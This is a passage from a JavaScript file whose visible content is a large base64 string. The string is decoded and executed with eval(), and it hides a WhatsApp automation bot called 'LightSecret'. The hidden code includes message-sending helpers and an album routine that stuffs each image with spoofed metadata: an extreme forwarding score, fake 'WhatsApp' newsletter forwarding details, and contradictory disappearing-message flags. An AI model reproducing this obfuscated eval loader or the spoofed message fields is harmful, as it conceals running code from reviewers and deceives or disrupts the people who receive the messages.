TWV0YWRhdGFbbWVzc2FnZS5pZF07CiAgICAgICAgYXdhaXQgKGF3YWl0IGltcG9ydChgLi9nYy5qc2ApKS5kZWZhdWx0KExpZ2h0U2VjcmV0LCBtZXNzYWdlKQogICAgIH0pCiAgICAgCiAgICBMaWdodFNlY3JldC5zZW5kVGV4dCA9IGFzeW5jIChqaWQsIHRleHQsIHF1b3RlZCA9ICcnLCBvcHRpb25zKSA9PiB7CiAgICAgICAgTGlnaHRTZWNyZXQuc2VuZE1lc3NhZ2UoamlkLCB7CiAgICAgICAgICAgIHRleHQ6IHRleHQsCiAgICAgICAgICAgIC4uLm9wdGlvbnMKICAgICAgICB9LHsgcXVvdGVkIH0pOwogICAgfQogICAgTGlnaHRTZWNyZXQuZG93bmxvYWRNZWRpYU1lc3NhZ2UgPSBhc3luYyAobWVzc2FnZSkgPT4gewogICAgICAgIGxldCBtaW1lID0gKG1lc3NhZ2UubXNnIHx8IG1lc3NhZ2UpLm1pbWV0eXBlIHx8ICcnCiAgICAgICAgbGV0IG1lc3NhZ2VUeXBlID0gbWVzc2FnZS5tdHlwZSA/IG1lc3NhZ2UubXR5cGUucmVwbGFjZSgvTWVzc2FnZS9naSwgJycpIDogbWltZS5zcGxpdCgnLycpWzBdCiAgICAgICAgY29uc3Qgc3RyZWFtID0gYXdhaXQgZG93bmxvYWRDb250ZW50RnJvbU1lc3NhZ2UobWVzc2FnZSwgbWVzc2FnZVR5cGUpCiAgICAgICAgbGV0IGJ1ZmZlciA9IEJ1ZmZlci5mcm9tKFtdKQogICAgICAgIGZvciBhd2FpdChjb25zdCBjaHVuayBvZiBzdHJlYW0pIHsKICAgICAgICAgICAgYnVmZmVyID0gQnVmZmVyLmNvbmNhdChbYnVmZmVyLCBjaHVua10pfQogICAgICAgIHJldHVybiBidWZmZXIKICAgIH0KCiAgICBMaWdodFNlY3JldC5zZW5kSW1hZ2VBc1N0aWNrZXIgPSBhc3luYyAoamlkLCBwYXRoLCBxdW90ZWQsIG9wdGlvbnMgPSB7fSkgPT4gewogICAgICAgIGxldCBidWZmID0gQnVmZmVyLmlzQnVmZmVyKHBhdGgpID8gCiAgICAgICAgICAgIHBhdGggOiAvXmRhdGE6Lio/XC8uKj87YmFzZTY0LC9pLnRlc3QocGF0aCkgPwogICAgICAgICAgICBCdWZmZXIuZnJvbShwYXRoLnNwbGl0YCwgYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/CiAgICAgICAgICAgIGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IAogICAgICAgICAgICBmcy5yZWFkRmlsZVN5bmMocGF0aCkgOiBCdWZmZXIuYWxsb2MoMCk7CiAgICAgICAgCiAgICAgICAgbGV0IGJ1ZmZlcjsKICAgICAgICBpZiAob3B0aW9ucyAmJiAob3B0aW9ucy5wYWNrbmFtZSB8fCBvcHRpb25zLmF1dGhvcikpIHsKICAgICAgICAgICAgYnVmZmVyID0gYXdhaXQgd3JpdGVFeGlmSW1nKGJ1ZmYsIG9wdGlvbnMpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGJ1ZmZlciA9IGF3YWl0IGFkZEV4aWYoYnVmZik7CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGF3YWl0IExpZ2h0U2VjcmV0LnNlbmRNZXNzYWdlKGppZCwgeyAKICAgICAgICAgICAgc3RpY2tlcjogeyB1cmw6IGJ1ZmZlciB9LCAKICAgICAgICAgICAgLi4ub3B0aW9ucyB9LCB7IHF1b3RlZCB9KTsKICAgICAgICByZXR1cm4gYnVmZmVyOwogICAgfTsKICAgIAogICAgTGlnaHRTZWNyZXQuZG93bmxvYWRBbmRTYXZlTWVkaWFNZXNzYWdlID0gYXN5bmMgKG1lc3NhZ2UsIGZpbGVuYW1lLCBhdHRhY2hFeHRlbnNpb24gPSB0cnVlKSA9PiB7CiAgICAgICAgbGV0IHF1b3RlZCA9IG1lc3NhZ2UubXNnID8gbWVzc2FnZS5tc2cgOiBtZXNzYWdlOwogICAgICAgIGxldCBtaW1lID0gKG1lc3NhZ2UubXNnIHx8IG1lc3NhZ2UpLm1pbWV0eXBlIHx8ICIiOwogICAgICAgIGxldCBtZXNzYWdlVHlwZSA9IG1lc3NhZ2UubXR5cGUgPyBtZXNzYWdlLm10eXBlLnJlcGxhY2UoL01lc3NhZ2UvZ2ksICIiKSA6IG1pbWUuc3BsaXQoIi8iKVswXTsKCiAgICAgICAgY29uc3Qgc3RyZWFtID0gYXdhaXQgZG93bmxvYWRDb250ZW50RnJvbU1lc3NhZ2UocXVvdGVkLCBtZXNzYWdlVHlwZSk7CiAgICAgICAgbGV0IGJ1ZmZlciA9IEJ1ZmZlci5mcm9tKFtdKTsKICAgICAgICBmb3IgYXdhaXQgKGNvbnN0IGNodW5rIG9mIHN0cmVhbSkgewogICAgICAgICAgICBidWZmZXIgPSBCdWZmZXIuY29uY2F0KFtidWZmZXIsIGNodW5rXSk7CiAgICAgICAgfQoKICAgICAgICBsZXQgdHlwZSA9IGF3YWl0IEZpbGVUeXBlLmZyb21CdWZmZXIoYnVmZmVyKTsKICAgICAgICBsZXQgdHJ1ZUZpbGVOYW1lID0gYXR0YWNoRXh0ZW5zaW9uID8gZmlsZW5hbWUgKyAiLiIgKyB0eXBlLmV4dCA6IGZpbGVuYW1lOwogICAgICAgIGF3YWl0IGZzLndyaXRlRmlsZVN5bmModHJ1ZUZpbGVOYW1lLCBidWZmZXIpOwogICAgICAgIAogICAgICAgIHJldHVybiB0cnVlRmlsZU5hbWU7CiAgICB9OwoKCiAgICBMaWdodFNlY3JldC5zZW5kVmlkZW9Bc1N0aWNrZXIgPSBhc3luYyAoamlkLCBwYXRoLCBxdW90ZWQsIG9wdGlvbnMgPSB7fSkgPT4gewogICAgICAgIGxldCBidWZmID0gQnVmZmVyLmlzQnVmZmVyKHBhdGgpID8gCiAgICAgICAgICAgIHBhdGggOiAvXmRhdGE6Lio/XC8uKj87YmFzZTY0LC9pLnRlc3QocGF0aCkgPwogICAgICAgICAgICBCdWZmZXIuZnJvbShwYXRoLnNwbGl0YCwgYFsxXSwgJ2Jhc2U2NCcpIDogL15odHRwcz86XC9cLy8udGVzdChwYXRoKSA/CiAgICAgICAgICAgIGF3YWl0IChhd2FpdCBnZXRCdWZmZXIocGF0aCkpIDogZnMuZXhpc3RzU3luYyhwYXRoKSA/IAogICAgICAgICAgICBmcy5yZWFkRmlsZVN5bmMocGF0aCkgOiBCdWZmZXIuYWxsb2MoMCk7CgogICAgICAgIGxldCBidWZmZXI7CiAgICAgICAgaWYgKG9wdGlvbnMgJiYgKG9wdGlvbnMucGFja25hbWUgfHwgb3B0aW9ucy5hdXRob3IpKSB7CiAgICAgICAgICAgIGJ1ZmZlciA9IGF3YWl0IHdyaXRlRXhpZlZpZChidWZmLCBvcHRpb25zKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBidWZmZXIgPSBhd2FpdCB2aWRlb1RvV2VicChidWZmKTsKICAgICAgICB9CgogICAgICAgIGF3YWl0IExpZ2h0U2VjcmV0LnNlbmRNZXNzYWdlKGppZCwgewogICAgICAgICAgICBzdGlja2VyOiB7IHVybDogYnVmZmVyIH0sIAogICAgICAgICAgICAuLi5vcHRpb25zIH0sIHsgcXVvdGVkIH0pOwogICAgICAgIHJldHVybiBidWZmZXI7CiAgICB9OwoKICAgIExpZ2h0U2VjcmV0LmFsYnVtTWVzc2FnZSA9IGFzeW5jIChqaWQsIGFycmF5LCBxdW90ZWQpID0+IHsKICAgICAgICBjb25zdCBhbGJ1bSA9IGdlbmVyYXRlV0FNZXNzYWdlRnJvbUNvbnRlbnQoamlkLCB7CiAgICAgICAgICAgIG1lc3NhZ2VDb250ZXh0SW5mbzogewogICAgICAgICAgICAgICAgbWVzc2FnZVNlY3JldDogY3J5cHRvLnJhbmRvbUJ5dGVzKDMyKSwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgCiAgICAgICAgICAgIGFsYnVtTWVzc2FnZTogewogICAgICAgICAgICAgICAgZXhwZWN0ZWRJbWFnZUNvdW50OiBhcnJheS5maWx0ZXIoKGEpID0+IGEuaGFzT3duUHJvcGVydHkoImltYWdlIikpLmxlbmd0aCwKICAgICAgICAgICAgICAgIGV4cGVjdGVkVmlkZW9Db3VudDogYXJyYXkuZmlsdGVyKChhKSA9PiBhLmhhc093blByb3BlcnR5KCJ2aWRlbyIpKS5sZW5ndGgsCiAgICAgICAgICAgIH0sCiAgICAgICAgfSwgewogICAgICAgICAgICB1c2VySmlkOiBMaWdodFNlY3JldC51c2VyLmppZCwKICAgICAgICAgICAgcXVvdGVkLAogICAgICAgICAgICB1cGxvYWQ6IExpZ2h0U2VjcmV0LndhVXBsb2FkVG9TZXJ2ZXIKICAgICAgICB9KTsKCiAgICAgICAgYXdhaXQgTGlnaHRTZWNyZXQucmVsYXlNZXNzYWdlKGppZCwgYWxidW0ubWVzc2FnZSwgewogICAgICAgICAgICBtZXNzYWdlSWQ6IGFsYnVtLmtleS5pZCwKICAgICAgICB9KTsKCiAgICAgICAgZm9yIChsZXQgY29udGVudCBvZiBhcnJheSkgewogICAgICAgICAgICBjb25zdCBpbWcgPSBhd2FpdCBnZW5lcmF0ZVdBTWVzc2FnZShqaWQsIGNvbnRlbnQsIHsKICAgICAgICAgICAgICAgIHVwbG9hZDogTGlnaHRTZWNyZXQud2FVcGxvYWRUb1NlcnZlciwKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICBpbWcubWVzc2FnZS5tZXNzYWdlQ29udGV4dEluZm8gPSB7CiAgICAgICAgICAgICAgICBtZXNzYWdlU2VjcmV0OiBjcnlwdG8ucmFuZG9tQnl0ZXMoMzIpLAogICAgICAgICAgICAgICAgbWVzc2FnZUFzc29jaWF0aW9uOiB7CiAgICAgICAgICAgICAgICAgICAgYXNzb2NpYXRpb25UeXBlOiAxLAogICAgICAgICAgICAgICAgICAgIHBhcmVudE1lc3NhZ2VLZXk6IGFsYnVtLmtleSwKICAgICAgICAgICAgICAgIH0sICAgIAogICAgICAgICAgICAgICAgcGFydGljaXBhbnQ6ICIwQHMud2hhdHNhcHAubmV0IiwKICAgICAgICAgICAgICAgIHJlbW90ZUppZDogInN0YXR1c0Bicm9hZGNhc3QiLAogICAgICAgICAgICAgICAgZm9yd2FyZGluZ1Njb3JlOiA5OTk5OSwKICAgICAgICAgICAgICAgIGlzRm9yd2FyZGVkOiB0cnVlLAogICAgICAgICAgICAgICAgbWVudGlvbmVkSmlkOiBbamlkXSwKICAgICAgICAgICAgICAgIHN0YXJyZWQ6IHRydWUsCiAgICAgICAgICAgICAgICBsYWJlbHM6IFsiWSIsICJJbXBvcnRhbnQiXSwKICAgICAgICAgICAgICAgIGlzSGlnaGxpZ2h0ZWQ6IHRydWUsCiAgICAgICAgICAgICAgICBidXNpbmVzc01lc3NhZ2VGb3J3YXJkSW5mbzogewogICAgICAgICAgICAgICAgICAgIGJ1c2luZXNzT3duZXJKaWQ6IGppZCwKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICBkYXRhU2hhcmluZ0NvbnRleHQ6IHsKICAgICAgICAgICAgICAgICAgICBzaG93TW1EaXNjbG9zdXJlOiB0cnVlLAogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIGltZy5tZXNzYWdlLmZvcndhcmRlZE5ld3NsZXR0ZXJNZXNzYWdlSW5mbyA9IHsKICAgICAgICAgICAgICAgIG5ld3NsZXR0ZXJKaWQ6ICIwQG5ld3NsZXR0ZXIiLAogICAgICAgICAgICAgICAgc2VydmVyTWVzc2FnZUlkOiAxLAogICAgICAgICAgICAgICAgbmV3c2xldHRlck5hbWU6IGBXaGF0c0FwcGAsCiAgICAgICAgICAgICAgICBjb250ZW50VHlwZTogMSwKICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKS50b0lTT1N0cmluZygpLAogICAgICAgICAgICAgICAgc2VuZGVyTmFtZTogIuKcpyBEaXR0c2FucyIsCiAgICAgICAgICAgICAgICBjb250ZW50OiAiVGV4dCBNZXNzYWdlIiwKICAgICAgICAgICAgICAgIHByaW9yaXR5OiAiaGlnaCIsCiAgICAgICAgICAgICAgICBzdGF0dXM6ICJzZW50IiwKICAgICAgICAgICAgfTsKCiAgICAgICAgICAgIGltZy5tZXNzYWdlLmRpc2FwcGVhcmluZ01vZGUgPSB7CiAgICAgICAgICAgICAgICBpbml0aWF0b3I6IDMsCiAgICAgICAgICAgICAgICB0cmlnZ2VyOiA0LAogICAgICAgICAgICAgICAgaW5pdGlhdG9yRGV2aWNlSmlkOiBqaWQsCiAgICAgICAgICAgICAgICBpbml0aWF0ZWRCeUV4dGVybmFsU2VydmljZTogdHJ1ZSwKICAgICAgICAgICAgICAgIGluaXRpYXRlZEJ5VXNlckRldmljZTogdHJ1ZSwKICAgICAgICAgICAgICAgIGluaXRpYXRlZEJ5U3lzdGVtOiB0cnVlLAogICAgICAgICAgICAgICAgaW5pdGlhdGVkQnlTZXJ2ZXI6IHRydWUsCiAgICAgICAgICAgICAgICBpbml0aWF0ZWRCeUFkbWluOiB0cnVlLAogICAgICAgICAgICAgICAgaW5pdGlhdGVkQnlVc2VyOiB0cnVlLAogICAgICAgICAgICAgICAgaW5pdGlhdGVkQnlBcHA6IHRydWUsCiAgICAgICAgICAgICAgICBpbml0aWF0ZWRCeUJvdDogdHJ1ZSwKICAgICAgICAgICAgICAgIGluaXRpYXRlZEJ5TWU6IHRydWUsCiAgICAgICAgICAgIH07CgogICAgICAgICAgICBhd2FpdCBMaWdodFNlY3JldC5yZWxheU1lc3NhZ2UoamlkLCBpbWcubWVzc2FnZSwgewogICAgICAgICAgICAgICAgbWVzc2FnZUlkOiBpbWcua2V5LmlkLAogICAgICAgICAgICAgICAgcXVvdGVkOiB7CiAgICAgICAgICAgICAgICAgICAga2V5OiB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJlbW90ZUppZDogYWxidW0ua2V5LnJlbW90ZUppZCwKICAgICAgICAgICAgICAgICAgICAgICAgaWQ6IGFsYnVtLmtleS5pZCwKICAgICAgICAgICAgICAgICAgICAgICAgZnJvbU1lOiB0cnVlLAogICAgICAgICAgICAgICAgICAgICAgICBwYXJ0aWNpcGFudDogTGlnaHRTZWNyZXQudXNlci5qaWQsCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBtZXNzYWdlOiBhbGJ1bS5tZXNzYWdlLAogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgfSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiBhbGJ1bTsKICAgIH07CiAgICAKICAgIExpZ2h0U2VjcmV0LnNlbmRTdGF0dXNNZW50aW9uID0gYXN5bmMgKGNvbnRlbnQsIGppZHMgPSBbXSkgPT4gewogICAgICAgIGxldCB1c2VyczsKICAgICAgICBmb3IgKGxldCBpZCBvZiBqaWRzKSB7CiAgICAgICAgICAgIGxldCB1c2VySWQgPSBhd2FpdCBMaWdodFNlY3JldC5ncm91cE1ldGFkYXRhKGlkKTsKICAgICAgICAgICAgdXNlcnMgPSBhd2FpdCB1c2VySWQucGFydGljaXBhbnRzLm1hcCh1ID0+IExpZ2h0U2VjcmV0LmRlY29kZUppZCh1LmlkKSk7CiAgICAgICAgfTsKCiAgICAgICAgbGV0IG1lc3NhZ2UgPSBhd2FpdCBMaWdodFNlY3JldC5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgInN0YXR1c0Bicm9hZGNhc3QiLCBjb250ZW50LCB7CiAgICAgICAgICAgICAgICBiYWNrZ3JvdW5kQ29sb3I6ICIjMDAwMDAwIiwKICAgICAgICAgICAgICAgIGZvbnQ6IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDkpLAogICAgICAgICAgICAgICAgc3RhdHVzSmlkTGlzdDogdXNlcnMsCiAgICAgICAgICAgICAgICBhZGRpdGlvbmFsTm9kZXM6IFsKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRhZzogIm1ldGEiLAogICAgICAgICAgICAgICAgICAgICAgICBhdHRyczoge30sCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRlbnQ6IFsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWc6ICJtZW50aW9uZWRfdXNlcnMiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJzOiB7fSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiBqaWRzLm1hcCgoamlkKSA9PiAoewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YWc6ICJ0byIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF0dHJzOiB7IGppZCB9LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiB1bmRlZmluZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgXSwKICAgICAgICAgICAgfQogICAgICAgICk7CgogICAgICAgIGppZHMuZm9yRWFjaChpZCA9PiB7CiAgICAgICAgICAgIExpZ2h0U2VjcmV0LnJlbGF5TWVzc2FnZShpZCwgewogICAgICAgICAgICAgICAgZ3JvdXBTdGF0dXNNZW50aW9uTWVzc2FnZTogewogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2U6IHsKICAgICAgICAgICAgICAgICAgICAgICAgcHJvdG9jb2xNZXNzYWdlOiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBrZXk6IG1lc3NhZ2Uua2V5LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHlwZTogMjUsCiAgICAgICAgICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHVzZXJKaWQ6IExpZ2h0U2VjcmV0LnVzZXIuamlkLAogICAgICAgICAgICAgICAgYWRkaXRpb25hbE5vZGVzOiBbCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB0YWc6ICJtZXRhIiwKICAgICAgICAgICAgICAgICAgICAgICAgYXR0cnM6IHsgaXNfc3RhdHVzX21lbnRpb246ICJ0cnVlIiB9LAogICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50OiB1bmRlZmluZWQsCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIF0sCiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBkZWxheSgyNTAwKTsKICAgICAgICB9KTsKICAgICAgICByZXR1cm4gbWVzc2FnZTsKICAgIH07CiAgICAKICAgIExpZ2h0U2VjcmV0LmV2Lm9uKCdjcmVkcy51cGRhdGUnLCBzYXZlQ3JlZHMpOwogICAgcmV0dXJuIExpZ2h0U2VjcmV0Owp9CgpMaWdodFNlY3JldHN0YXJ0KCk7CgpsZXQgZmlsZSA9IHJlcXVpcmUucmVzb2x2ZShfX2ZpbGVuYW1lKQpyZXF1aXJlKCdmcycpLndhdGNoRmlsZShmaWxlLCAoKSA9PiB7CiAgcmVxdWlyZSgnZnMnKS51bndhdGNoRmlsZShmaWxlKQogIGNvbnNvbGUubG9nKCdceDFiWzA7MzJtJytfX2ZpbGVuYW1lKycgXHgxYlsxOzMybXVwZGF0ZWQhXHgxYlswbScpCiAgZGVsZXRlIHJlcXVpcmUuY2FjaGVbZmlsZV0KICByZXF1aXJlKGZpbGUpCn0p')))")();
  eval(decode);
})();